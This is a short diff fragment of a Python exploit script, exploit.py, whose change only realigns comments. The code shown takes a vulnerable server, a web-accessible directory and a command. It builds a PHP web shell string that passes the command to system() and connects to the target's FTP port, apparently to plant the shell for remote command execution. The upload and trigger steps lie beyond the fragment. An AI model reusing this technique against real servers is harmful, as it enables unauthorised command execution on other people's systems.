@@ -12,9 +12,9 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 if(len(sys.argv) < 4):
     print '\n Usage : exploit.py server directory cmd'
 else:
-    server = sys.argv[1] #Vulnerable Server
-    directory = sys.argv[2] # Path accessible from web .....
-    cmd = sys.argv[3] #PHP payload to be executed
+    server = sys.argv[1]         # Vulnerable Server
+    directory = sys.argv[2]      # Path accessible from web .....
+    cmd = sys.argv[3]            # PHP payload to be executed
     evil = '<?php system("' + cmd + '") ?>'
     s.connect((server, 21))
     s.recv(1024)
